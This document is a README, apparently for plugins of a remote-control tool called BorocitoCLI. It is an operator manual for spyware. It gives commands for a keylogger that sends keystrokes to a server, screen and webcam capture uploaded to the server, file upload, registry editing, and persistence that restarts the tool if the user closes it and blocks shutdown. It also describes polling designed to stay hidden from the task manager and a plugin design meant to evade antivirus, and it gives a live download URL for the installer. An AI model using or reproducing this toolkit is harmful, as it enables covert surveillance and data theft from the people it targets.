# borocito-components
Complementos para Borocito CLI  

## Complements
These plugins were created to enrich the experience with BorocitoCLI.  

They're not perfect, but they're not disappointing either. Well, it really depends on how they're made. I invite you to contribute to the development of these, if there is something, an error, bug, an idea, etc, contribute, I will greatly appreciate it, and those of us who use these complements too.  

### Using it
All plugins here were created by Zhenboro. Yeah, and besides the fact that I made them, they need to be installed by 'boro-get'.  
boro-get is a module within BorocitoCLI. It's totally inside, well implemented. So, initially, there should be no problem.  

### About
BORO-GET tries to solve the following problem: Avoid over-loading the distributable executable. In addition, this gives freedom to create your own supplements and install them remotely. Total control. If you need a function, you can program it and implement it for yourself.  
Not only that, we also avoid the signature of the antivirus. Well, for example, Brokiloger is very suspicious, it is a keys recorder. Thus the antivirus could only block that complement, but, not the instance of Borocito.

### Repository
On the server, the Boro-Get folder is where everything boro-get will use.
You can leave the files that are within boron-get as they were when you downloaded them, this will make my repository be used located in my inventible "chemic-jug" server.   
Also, if you want my server to provide you with the repository, you must modify the file 'GlobalSettingS.ini' that is in the Borocito Server-side root folder.   

I really recommend you use my repository, upload updates with improvements, etc. So you avoid having to update your repository.  

**Remember: it's just a repository. I can not steal the victims and either receive files either. It's just read-only**  

---
### boro-get
This must be installed, by default it is not implemented. It should be installed using the command `boro-get install`, to check if it is installed or not, use `boro-get status`, if it is already installed, great!  
Now, if you want to be sure the latest version is installed, use `boro-get uninstall`, that will uninstall boro-get. Then you can use the `boro-get install` command to download and install the latest version available on the server indicated in the file: GlobalSettings.ini and the file boro-get.txt thats inside boro-get.zip file (/Boro-Get/boro-get.zip)  

```sh
[Components]
boro-get=http://chemic-jug.000webhostapp.com/Borocito/Boro-Get/boro-get.zip
```  
Now that boro-get is installed. We can start installing and using the packages.  

We can install a package with the command `boro-get <package> <start?> <parameters>`  
An example with broKiloger:  
`boro-get broKiloger True /startrecording`  
If the package does not require an argument:  
`boro-get broKiloger`  
(<start?> will be marked as True, the package will start)  

If you don't want to start it (just download and install it)  
`boro-get broKiloger False null`  

>NOTE: 'null' is a reserved word, it will be very useful!  

Now, lets get info about a component, with the command:  
`boro-get <package> status`  
so, an example will be:  
`boro-get broKiloger status`  
You will get information about the component. boro-hear MUST BE INSTALLED.  

Now we are going to define a concept.  
**Single Instance Package**: A package with this warning means that only one instance of it will be started. Just one.  
These are designed to do unique unrepeatable things. Like a keylogger. This is something global, why another instance?  
Also, they can receive parameters when they are already started, so you can control them.  

---
### boro-hear
boro-hear is a module that allows plugins to communicate (one-way C->S) with the Control Panel.  

If you make a plugin, you can make it send messages to the control panel. In your code you should put something like [this code](https://github.com/Zhenboro/borocito-components/blob/33632ac2104ceabbc001c9de55fb82cf519842f8/boro-get/Utility.vb#L40-L57).  
That will start an instance of boro-hear which will send your message to the server. boro-hear is single-instance, but messages can be sent by passing parameters to it. These are picked up by boro-hear via the StartUpNextInstance event.  

---
### broEstoraje
It is used to perform typical operations of a FileSystem, delete, move, copy, rename and compress in zip.  
**Compress a folder:**  
```sh
/ZipToDir <folderPath> <zipFilePath(must include extencion)>  
```
Example: /ZipToDir C:\Users\Zhenboro\Desktop C:\Users\Zhenboro\Escroto.zip  

---
**Decompress zip to folder:**  
```sh
/ZipToDir <zipPath> <dirPath>  
```
Example: /ZipToDir C:\Users\Zhenboro\Escroto.zip C:\Users\Zhenboro\Desktop  

---
**Rename:**  
```sh
/RenameFile <filePath> <newName>  
```
Example: /RenameFile C:\Users\Zhenboro\Escroto.zip Escritorio.zip  
```sh
/RenameDirectory <folderPath> <newName>  
```
Example: /RenameDirectory C:\Users\Zhenboro\Carpeta0 Carpeta1  

---
**Copy:**  
```sh
/CopyFile <filePath> <newFilePath>  
```
Example: /CopyFile C:\Users\Zhenboro\Escroto.zip C:\Users\Zhenboro\Copia.zip  
```sh
/CopyDirectory <folderPath> <newName>  
```
Example: /CopyDirectory C:\Users\Zhenboro\Carpeta0 C:\Users\Zhenboro\Carpeta1  

---
**Move:**  
```sh
/MoveFile <filePath> <newFilePath>  
```
Example: /MoveFile C:\Users\Zhenboro\Escritorio.zip C:\Users\Zhenboro\Desktop\Escritorio.zip
```sh
/MoveDirectory <folderPath> <newFolderPath>  
```
Example: /MoveDirectory C:\Users\Zhenboro\Carpeta0 C:\Users\Zhenboro\Desktop\Carpeta0  

---
**Upload:**  
Just like the `/Payloads.Upload.File=<filepath>,<null, phpPost>` command. you can upload a file to the server.  
```sh
/Upload <filePath> 
```
It will be sent to the php fileUpload on the server  

---
### broKiloger
broKiloger is a plugin dedicated to logging keys.  

> NOTE: Single Instance Package  

Your options are:  
```sh
/startrecording: It will start key recording.
boro-get broKiloger True /startrecording
```
```sh  
/stoprecording: It will stop the key recording and broKiloger will close.  
boro-get broKiloger True /stoprecording  
```
> NOTE: It will not save or send the record.  

```sh
/sendrecord: It will send the keylogger and then start recording again.
boro-get broKiloger True /sendrecord
```  

```sh
/resetrecord: It will clean the keylogger.
boro-get broKiloger True /resetrecord
```  
> NOTE: It will not save or send the record.  

```sh
/sendandexit: It will send the keylogging and then broKiloger will close.
boro-get broKiloger True /sendandexit
```  

Can't undestand a shit? [Key mapping for broKiloger keylog](https://chemic-jug.000webhostapp.com/Borocito/Mapeo_Teclas_Kiloger.txt)  

---
### broRescue
> NOTE: Single Instance Package  

This plugin was created because it turns out that sometimes an instance of BorocitoCLI can be closed by some external or internal factor. Perhaps the user noticed the presence and closed it, or, a command left a mess that BorocitoCLI couldn't handle.  
For this reason, broRescue is a good recommendation that it be installed.  
**And what does it do?**  
Well it's simple. If you notice that BorocitoCLI has closed. You can make broRescue restart the BorocitoCLI instance by using the command:  
`broRescue Borocito`  
and not only that, you can also start the extractor, or the updater.  
To do this, the commands will be:  
`broRescue Extractor`  
`broRescue Updater`  
Or even restart the computer with the command:  
`broRescue Restart`  
And, you can also try to prevent the computer from being turned off. with `broRescue NoShutdown` to avoid or, `YesShutdown` to not try to avoid.  
This packet reads directly from the server. Every 5 minutes. So yes, you will notice the effect in 5 minutes. And that is done so as not to load the server, and also so that it is not noticed from the task manager.  
**You can also get the number of seconds since the user's last activity with the command:**  
```sh
/GetAFK
```
Example:  
```sh
boro-get broRescue True /GetAFK
```
Data returned *(boro-hear must be installed)* 
*The response is immediate (not 5 minutes later)*
```sh
Return
	uInteger
		(in seconds)
Example
	60
		(1min (60sec) of inactivity)
	0
		(0s of inactivity. The user is active)
```  

This comp will start with windows.  

---
### broScrincam
> NOTE: Single Instance Package  

This plugin is for:  
- Take photos from a Webcam (not coded yet)  
- Record video from a Webcam (not coded yet)  
- Record screen (it should work)  
*The function to record the screen should work, but in my case the server does NOT allow uploading the recording file because it is very large*  

```sh
/startscreenrecording: Will start to record the screen.
boro-get broScrincam True /startscreenrecording
```  
---
```sh
/stopscreenrecording: It is supposed to stop screen recording. 
boro-get broScrincam True /stopscreenrecording
```  
> NOTE: It will not save or send the record.
---
```sh
/sendscreenrecord: It stop, save and send the screen recording.
boro-get broScrincam True /sendscreenrecord
```  
---
```sh
/startcamrecording: It will start to record video from the webcam
boro-get broScrincam True /startcamrecording
```  
---
```sh
/takecampicture: It will take a screenshot of the webcam
boro-get broScrincam True /takecampicture
```  
> NOTE: It will be sent automatically.  
---
```sh
/stopcamrecording: It will stop the Webcam recording.
boro-get broScrincam True /stopcamrecording
```  
> NOTE: It will not save or send the record.  
---
```sh
/sendcamrecord: It will stop the Webcam recording and send it automatically.
boro-get broScrincam True /sendcamrecord
```
> NOTE: It will be sent automatically.
---
```sh
/stop: It will send the keylogger and then start recording again.
boro-get broScrincam True /stop
```
---
### broReedit
This complement allows you to modify the Windows Registry.
> NOTE: Single Instance Package  
---
To select a "Hive":  
```sh
/selecthk <hive>
```
Hives:  
- ClassesRoot
- CurrentConfig
- CurrentUser
- LocalMachine
- PerformanceData
-  Users

Example:  
```sh
/selecthk CurrentUser
```
---
To select a SubKey:  
```sh
/selectkey <subkey>
```
Example:  
```sh
/selecthk SOFTWARE\Borocito
```
---
To get a value:  
```sh
/getvalue <valueName>
```
Example:  
```sh
/getvalue OwnerServer
```
---
To set a value:  
```sh
/setvalue <valueName> <value> <valueKind>
```
See types in [RegistryValueKind Enum (Microsoft.Win32) | Microsoft Docs](https://docs.microsoft.com/en-us/dotnet/api/microsoft.win32.registryvaluekind?msclkid=cb066977c71011ecb24bd53c4a938a9b&view=net-6.0)
Example:  
```sh
/setvalue OwnerServer http://.../ 1
```
If you set null in valueKind then will be 1 (String)

---
To delete a value:  
```sh
/deletevalue <valueName>
```
Example:  
```sh
/deletevalue OwnerServer
```
---
To get a value names:  
```sh
/getvaluenames()
```
Return:  
```sh
	OwnerServer
	UID
	(etc...)
```
---
To get a value kind:  
```sh
/getvaluekind <valueName>
```
Example:  
```sh
	/getvaluekind OwnerServer
```
Return:  
```sh
	1
```
See types in [RegistryValueKind Enum (Microsoft.Win32) | Microsoft Docs](https://docs.microsoft.com/en-us/dotnet/api/microsoft.win32.registryvaluekind?msclkid=cb066977c71011ecb24bd53c4a938a9b&view=net-6.0)

---
To create a SubKey:  
```sh
/createsubkey <subKeyName>
```
Example:  
```sh
/createsubkey Backup
```
---
To delete a subkey:  
```sh
/deletesubkey <subkeyName>
```
Example:  
```sh
/deletesubkey boro-get
```
---
To delete a subkey tree:  
```sh
/deletesubkeytree <subkeyName>
```
Example:  
```sh
/deletesubkeytree boro-get
```
(Will remove all subkeys hanging from the "boro-get" key)


## Uninstalling a package
To uninstall, remove a package, the following points must be taken into account.
- The plugin MUST BE CLOSED. There should not be an instance of this. Read the documentation to know how to close it. *Anyways, boro-get will try to stop the plugin, but this might fail.*  
- All data from this plugin, recordings, files, etc. will be deleted.  
- They can be reinstalled, don't worry about it.  

To uninstall, use the `boro-get <package> uninstall` command.  
An example with broKiloger would be:  
`boro-get broKiloger uninstall`  

---
### WARNING
**The plugins created are not perfect. I recommend you take a look at the code to know what it does and how it does it, so you avoid unpredictable behavior or bad practices.**
